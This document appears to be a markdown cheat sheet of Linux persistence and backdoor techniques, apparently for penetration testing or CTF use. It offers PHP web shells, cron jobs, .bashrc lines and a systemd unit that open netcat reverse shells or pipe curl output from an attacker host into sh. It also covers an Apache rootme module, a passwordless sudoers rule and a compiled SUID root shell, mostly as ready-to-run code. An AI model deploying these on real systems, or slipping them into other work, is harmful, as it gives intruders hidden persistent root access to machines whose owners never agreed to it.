# Ideas for backdoors
Always room for more

### Add our public key to some user’s authorized_keys file
[Arch linux SSH wiki]{https://wiki.archlinux.org/title/SSH_keys}
`ssh-keygen -t rsa -b 2048 -C "$(whoami)@$(uname -n)-$(date -I)"`

### Add PHP backdoor
```
<?php
    if (isset($_REQUEST['cmd'])) {
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
    }
?>
```
or use HTTP request header 
```
<?php
    if (isset($_SERVER['HTTP_CMD'])) {
        echo "<pre>" . shell_exec($_SERVER['HTTP_CMD']) . "</pre>";
    }
?>
```

### CRON Jobs
periodically send a reverse shell back to your attacker machine
```
CT=$(crontab -l)
CT=$CT$'\n10 * * * * nc -e /bin/bash <ATTACKER_IP> <PORT>'
printf "$CT" | crontab -
```

```
CT=$(crontab -l)
CT=$CT$'\n10 * * * * curl http://<ATTACKER_IP>/run | sh'
printf "$CT" | crontab -
```

### Apache mod_rootme
Apache module [LINK]{https://github.com/sajith/mod-rootme} can be installed for a privileged backdoor

Needs to be compiled.  Add the following commands to config 
(usually /etc/apache2/apache2.conf or /etc/httpd/conf/httpd.conf):

```
LoadModule rootme_module /usr/lib/apache2/modules/mod_rootme.so
```

### User's .bashrc
Add reverse shell when intractive session is started.
[LINK]{https://www.lifewire.com/bashrc-file-4101947}
```
echo 'nc -e /bin/bash <ATTACKER_IP> <PORT> 2>/dev/null &' >> ~/.bashrc
```

### Add a system service
systemctl or rc.local
```
[Unit]
Description=Very important backdoor.
[Service]
Type=simple
ExecStart=/usr/bin/nc -e /bin/bash <ATTACKER_IP> <PORT> 2>/dev/null
[Install]
WantedBy=default.target
```

### audoers
<USER>        ALL=(ALL)        NOPASSWD: ALL

### SUID
normally: chmod u+s {file_name}  
Play with symlinks
The example requires a compiler
```
echo 'int main() { setresuid(0,0,0); system("/bin/sh"); }' > privshell.c
gcc -o privshell privshell.c
rm privshell.c
chown root:root privshell
chmod u+s privshell
```
Move privshell to a safe place and run it later as an unprivileged user to get root shell.
